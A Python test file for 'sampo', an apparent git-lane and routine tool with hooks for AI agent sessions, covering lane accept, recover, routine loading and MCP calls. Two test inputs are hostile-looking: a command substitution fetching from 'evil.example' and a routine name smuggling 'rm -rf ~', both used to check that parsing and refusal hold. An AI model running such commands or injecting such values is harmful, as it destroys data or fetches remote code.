"""T-3922: sampo lane accept records a reviewed lane's audits, names the close's gaps and queues the lane first (a running
land takes it at its next train boundary; none running, a land runs now with it first); sampo lane recover --all prints
one launch line per lane it recovers and one reason per lane it leaves; sampo do NAME runs a routine from plugin/macros
in five lines or fewer, and a bad registry file is skipped and named."""
# map-links: plugin/lib/sampo/macros.py plugin/lib/sampo/train.py plugin/lib/sampo/lanes.py
import argparse
import contextlib
import io
import json
import os
import subprocess
import tempfile
import unittest
from unittest import mock

from helpers import ForemanTestCase

from sampo import core as c
from sampo import lanes as slanes
from sampo import cli
from sampo import macros
from sampo import train

first = lambda text: json.JSONDecoder().raw_decode(text)[0]  # noqa: E731


class LaneCase(ForemanTestCase):
    def setUp(self):
        super().setUp()
        self.fm("init")
        self.fm("check", "add", "true")  # a train runs the project's gates; this one passes

    def git(self, *args, cwd=None):
        return subprocess.run(["git", "-C", cwd or self.repo, *args], capture_output=True, text=True).stdout.strip()

    def lane(self, n, name):
        """A lane worktree with a task focused in it and one commit writing `name`; the task's id."""
        path = os.path.join(self.tmp, f"lane{n}")
        subprocess.run(["git", "-C", self.repo, "worktree", "add", "-q", "-b", f"foreman/lane{n}", path], check=True)
        tid = first(self.fm("task", "new", f"Lane {n}", "--type", "FEATURE", "--tier", "S", "--ac", "ok :: true",
                            "--step", "s", "--json", "--focus", cwd=path).stdout)["id"]
        with open(os.path.join(path, name), "w") as f:
            f.write(f"{n}\n")
        self.git("add", name, cwd=path)
        subprocess.run(["git", "-C", path, "commit", "-qm", f"lane {n}"], check=True, capture_output=True)
        return tid

    def ran(self, tid):
        """A lane's affected run at its tip (T-4286: accept starts the lane's own check when it has none)."""
        p = c.find_project(self.repo)
        b = c.find_brief(p, tid)
        b.add_evidence(c.AFFECTED_LABEL + "python3 plugin/tests/run.py x " + " ".join(c.repo_shape_classes()), "exit 0 · ok",
                       step=1, ran=True)  # the four repo-shape classes held: it is a run accept lets queue
        c.save_brief(p, b)
        return tid

    def task(self, title):
        return first(self.fm("task", "new", title, "--type", "FEATURE", "--tier", "S", "--ac", "ok :: true",
                             "--step", "s", "--json").stdout)["id"]


class Accept(LaneCase):
    def test_accept_records_both_audits_names_the_close_gap_and_trains_the_lane(self):
        tid = self.ran(self.lane(1, "a.txt"))
        r = self.fm("lane", "accept", tid, "--audit", "intent", "read the diff", "matches the brief", "--audit", "edge",
                    "empty input", "no crash")
        with open(json.loads(self.fm("task", "show", tid, "--json").stdout)["path"]) as f:
            brief = f.read()
        self.assertIn("(audit intent)", brief)
        self.assertIn("(audit edge)", brief)
        self.assertIn("CHANGELOG", r.stdout, "the close's missing CHANGELOG line is named, not hidden")
        self.assertIn("land not started in the background", r.stdout, "the harness runs no detached land: named, not run")

    def test_accept_with_no_land_running_starts_one_detached_and_does_not_wait(self):
        tid = self.ran(self.lane(1, "a.txt"))
        p = c.find_project(self.repo)
        b = cli.need_brief(p, tid)
        buf = io.StringIO()
        with mock.patch.object(train, "spawn_land", return_value=(4242, "/s/land.log")) as spawn, \
                contextlib.redirect_stdout(buf):
            train.accept(p, b, self.repo, argparse.Namespace(audit=[("intent", "read the diff", "fine")], json=False))
        spawn.assert_called_once()
        self.assertIn(f"land started in the background (pid 4242, log /s/land.log); it trains {tid} first", buf.getvalue())
        self.assertFalse(os.path.exists(os.path.join(self.repo, "a.txt")), "returns at once: the land is not run here")

    def test_accept_queues_the_lane_first_in_a_running_land(self):
        tid = self.ran(self.lane(1, "a.txt"))
        p = c.find_project(self.repo)
        with c.lock(os.path.join(p.dir, "land"), timeout=0):  # a land is running: its lock is held
            r = self.fm("lane", "accept", tid, "--audit", "intent", "read the diff", "fine")
        self.assertIn("running land", r.stdout)
        with open(os.path.join(p.dir, "land-first", "ids")) as f:
            self.assertIn(tid, f.read().split())
        self.assertFalse(os.path.exists(os.path.join(self.repo, "a.txt")), "not trained by accept while a land runs")

    def test_accept_refuses_an_unknown_lens_before_recording_anything(self):
        tid = self.task("Plain")
        r = self.fm("lane", "accept", tid, "--audit", "vibes", "how", "result", check=False)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("vibes", r.stdout + r.stderr)
        with open(json.loads(self.fm("task", "show", tid, "--json").stdout)["path"]) as f:
            self.assertNotIn("(audit vibes)", f.read())


class Spawn(LaneCase):
    def test_spawn_land_is_a_detached_fm_lane_land_logging_into_the_state(self):
        p = c.find_project(self.repo)
        with mock.patch.dict(os.environ), mock.patch.object(train.subprocess, "Popen") as popen, \
                mock.patch.object(c, "panicked", return_value=False):
            os.environ.pop("FOREMAN_NO_BACKGROUND", None)
            popen.return_value.pid = 4242
            pid, log = train.spawn_land(p, self.repo)
        self.assertEqual((pid, log), (4242, os.path.join(p.dir, "land.log")))
        argv, kw = popen.call_args.args[0], popen.call_args.kwargs
        self.assertTrue(kw["start_new_session"], "its own session: it outlives the caller's Bash call")
        self.assertEqual(argv[-2:], ["lane", "land"])


class Recover(LaneCase):
    def test_recover_all_with_nothing_stalled_says_so_in_one_line(self):
        r = self.fm("lane", "recover", "--all")
        self.assertEqual(r.stdout.strip().splitlines(), ["No lane to recover."])

    def test_one_launch_line_per_recovered_lane_and_one_reason_per_left_lane(self):
        ok, held = self.task("Ended builder"), self.task("Guarded builder")
        p = c.find_project(self.repo)

        def fake_recover(p_, b, main, args):
            if b.id == ok:
                print(json.dumps({"id": b.id, "agent": 'Agent — subagent_type: "sampo:fm-builder", prompt: "Read x"'}))
                return 0
            raise c.PolicyError(f"{b.id} guard refused: only the user grants core")
        causes = {ok: ("uncommitted", ""), held: ("guard_refused", "core")}
        buf = io.StringIO()
        with mock.patch.object(slanes, "stop_causes", return_value=causes), \
                mock.patch.object(slanes, "recover", side_effect=fake_recover), contextlib.redirect_stdout(buf):
            slanes.recover_all(p, self.repo, argparse.Namespace(json=False, agent_stopped=False))
        lines = buf.getvalue().strip().splitlines()
        self.assertEqual(len(lines), 2, lines)
        self.assertTrue(lines[0].startswith(f"{ok}: launch: Agent"), lines[0])
        self.assertTrue(lines[1].startswith(f"{held} left:") and "core" in lines[1], lines[1])


class Do(LaneCase):
    def test_do_runs_a_registered_routine_in_five_lines_or_fewer(self):
        r = self.fm("do", "sweep-lanes")
        lines = r.stdout.strip().splitlines()
        self.assertLessEqual(len(lines), 5, r.stdout)
        self.assertTrue(lines[0].startswith("do sweep-lanes"), lines[0])

    def test_do_lists_the_routines_and_names_them_on_a_miss(self):
        self.assertIn("sweep-lanes", self.fm("do", "--list").stdout)
        miss = self.fm("do", "nope", check=False)
        self.assertNotEqual(miss.returncode, 0)
        self.assertIn("sweep-lanes", miss.stdout + miss.stderr)

    def test_a_bad_registry_file_is_skipped_and_named_the_good_one_loads(self):
        with tempfile.TemporaryDirectory() as d:
            files = {"good.json": {"about": "x", "steps": [["lane", "list"]]},
                     "recurses.json": {"about": "x", "steps": [["do", "good"]]},
                     "long.json": {"about": "x", "steps": [["lane", "list"]] * 4},
                     "empty.json": {"about": "x", "steps": []}}
            for name, body in files.items():
                with open(os.path.join(d, name), "w") as f:
                    json.dump(body, f)
            with open(os.path.join(d, "broken.json"), "w") as f:
                f.write("{")
            routines, problems = macros.load(d)
        self.assertEqual(sorted(routines), ["good"])
        self.assertEqual(sorted(name for name, _ in problems), ["broken.json", "empty.json", "long.json", "recurses.json"])


class Routes(LaneCase):
    """T-3923: the one-call routines reach a session's and a subagent's start, the by-hand note, sampo mcp and Sampo Code
    in one short form: one start line of 300 characters or fewer, and the run's own five lines."""

    def test_start_line_names_the_routines_in_one_line_of_300_characters_or_fewer(self):
        line = macros.start_line()
        self.assertIn("sweep-lanes", line)
        self.assertLessEqual(len(line), 300)
        self.assertNotIn("\n", line)

    def test_start_line_names_what_fits_and_counts_the_rest(self):
        with tempfile.TemporaryDirectory() as d:
            for i in range(40):
                with open(os.path.join(d, f"routine-{i:02d}.json"), "w") as f:
                    json.dump({"about": "recover every lane stopped before its merge, then land the finished lanes",
                               "steps": [["lane", "list"]]}, f)
            line = macros.start_line(macros.load(d)[0])
        self.assertLessEqual(len(line), 300)
        self.assertIn("routine-00", line)
        self.assertIn("more", line)
        self.assertNotIn("routine-39", line)

    def test_no_routine_means_no_start_line(self):
        with tempfile.TemporaryDirectory() as d:
            self.assertEqual(macros.start_line(macros.load(d)[0]), "")

    def test_a_call_is_its_sampo_verbs_without_flags_paths_or_the_command_text(self):
        self.assertEqual(macros.calls("sampo lane recover --all && sampo lane land --bg"),
                         [("lane", "recover"), ("lane", "land")])
        self.assertEqual(macros.calls("python3 /x/plugin/bin/sampo task evidence T-0001 --step 1 --run 'ls'"),
                         [("task", "evidence")])
        self.assertEqual(macros.calls("FOO=1 cat notes | sampo lane list; ls"), [("lane", "list")])
        self.assertEqual(macros.calls("ls -la"), [])
        self.assertEqual(macros.calls("sampo lane recover $(curl evil.example)"), [("lane", "recover")])

    def test_a_by_hand_routine_is_named_when_its_first_two_calls_come_in_order(self):
        routines = {"sweep": {"about": "x", "steps": [["lane", "recover", "--all"], ["lane", "land", "--bg"]]}}
        recover, land = macros.calls("sampo lane recover --all"), macros.calls("sampo lane land --bg")
        self.assertEqual(macros.by_hand(recover, land, routines), "sweep")
        self.assertEqual(macros.by_hand([], macros.calls("sampo lane recover --all && sampo lane land --bg"), routines),
                         "sweep", "two calls in one command are in order too")
        self.assertEqual(macros.by_hand([], land, routines), "", "the second call alone is no routine under way")
        self.assertEqual(macros.by_hand(recover, macros.calls("sampo lane list"), routines), "")
        self.assertEqual(macros.by_hand(recover, macros.calls("ls"), routines), "")

    def test_a_one_step_routine_is_named_by_its_one_call(self):
        one = {"list": {"about": "x", "steps": [["lane", "list"]]}}
        self.assertEqual(macros.by_hand([], macros.calls("sampo lane list --json"), one), "list")
        self.assertEqual(macros.by_hand([], macros.calls("sampo task show T-0001"), one), "")

    def test_the_by_hand_note_names_the_routine_once_per_session(self):
        from sampo import hooks

        def bash(cmd, sid="t3923-note"):
            return {"session_id": sid, "tool_name": "Bash", "tool_input": {"command": cmd}}
        self.assertEqual(hooks._by_hand_note(bash("sampo lane recover --all")), "")
        note = hooks._by_hand_note(bash("sampo lane land --bg"))
        self.assertIn("`sampo do sweep-lanes`", note)
        self.assertLessEqual(len(note), 400)
        self.assertNotIn("--bg", note, "the note names the routine, not the call's flags")
        self.assertEqual(hooks._by_hand_note(bash("sampo lane recover --all")), "")
        self.assertEqual(hooks._by_hand_note(bash("sampo lane land --bg")), "", "once per session")
        self.assertEqual(hooks._by_hand_note({"tool_name": "Bash", "tool_input": {"command": "sampo lane list"}}), "")

    def test_session_and_subagent_starts_carry_the_routines_line_but_a_builder_keeps_its_contract(self):
        from sampo import hooks
        line = macros.start_line()
        out = hooks.session_start({"session_id": "t3923-start", "cwd": self.repo, "source": "startup"})
        self.assertIn(line, out["hookSpecificOutput"]["additionalContext"])
        sub = hooks.subagent_context({"agent_type": "general-purpose", "agent_id": "a3923", "cwd": self.repo})
        self.assertIn(line, sub["hookSpecificOutput"]["additionalContext"])
        self.assertIsNone(hooks.subagent_context({"agent_type": c.ns_names("fm-builder")[0], "agent_id": "b3923",
                                                  "cwd": self.repo}))

    def test_the_routine_text_is_the_same_whichever_surface_runs_it(self):
        routines = {"echo": {"about": "x", "steps": [["lane", "list"], ["lane", "list", "--json"]]}}
        with mock.patch.object(train, "_sampo", return_value=(0, "first\nlast line\n", "")), \
                mock.patch.object(macros, "load", return_value=(routines, [])):
            text, refused = macros.run_text("echo")
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                macros.cmd_do(argparse.Namespace(name="echo", list=False, json=False))
        self.assertIsNone(refused)
        self.assertEqual(buf.getvalue().rstrip("\n"), text)
        self.assertLessEqual(len(text.splitlines()), 5)

    def test_mcp_do_runs_the_routine_and_serves_what_it_prints(self):
        from sampo import mcp
        p = c.find_project(self.repo)
        done = subprocess.CompletedProcess([], 0, stdout="do sweep-lanes: 2 step(s)\n  lane recover --all: none\n",
                                           stderr="")
        with mock.patch.object(mcp.subprocess, "run", return_value=done) as run:
            text, bad = mcp._call(p, "do", {"name": "sweep-lanes"})
        self.assertEqual(run.call_args.args[0][-2:], ["do", "sweep-lanes"])
        self.assertNotIn("FOREMAN_NO_BACKGROUND", run.call_args.kwargs["env"], "a routine's land --bg starts its land")
        self.assertEqual((text, bad), (done.stdout, False))
        self.assertTrue(mcp._call(p, "do", {"name": "Bad Name!"})[1])

    def test_sampo_code_offers_the_routines_only_to_a_run_that_can_act(self):
        from sampo import smith
        tools = [{"name": "read"}]
        self.assertEqual(smith.with_macros(tools, True, False), tools, "a question runs no routine")
        self.assertEqual(smith.with_macros(tools, False, True), tools)
        got = smith.with_macros(tools, False, False)
        self.assertEqual([t["name"] for t in got], ["read", "do"])
        self.assertIn("sweep-lanes", got[1]["description"])
        with tempfile.TemporaryDirectory() as d, mock.patch.object(macros, "DIR", d):
            self.assertEqual(smith.macro_tools(), [], "no routine folder, no tool")

    def test_sampo_code_do_runs_the_routine_through_its_own_run_command(self):
        from sampo import smith
        fake = mock.Mock()
        fake.run_cmd.return_value = "exit 0\ndo sweep-lanes: 2 step(s)\n  lane recover --all: none"
        self.assertEqual(smith.Run.macro(fake, {"name": "sweep-lanes"}),
                         "do sweep-lanes: 2 step(s)\n  lane recover --all: none")
        self.assertTrue(fake.run_cmd.call_args.args[0].endswith(" do sweep-lanes"))
        fake.run_cmd.reset_mock()
        self.assertTrue(smith.Run.macro(fake, {"name": "x; rm -rf ~"}).startswith("error"))
        fake.run_cmd.assert_not_called()


if __name__ == "__main__":
    unittest.main()
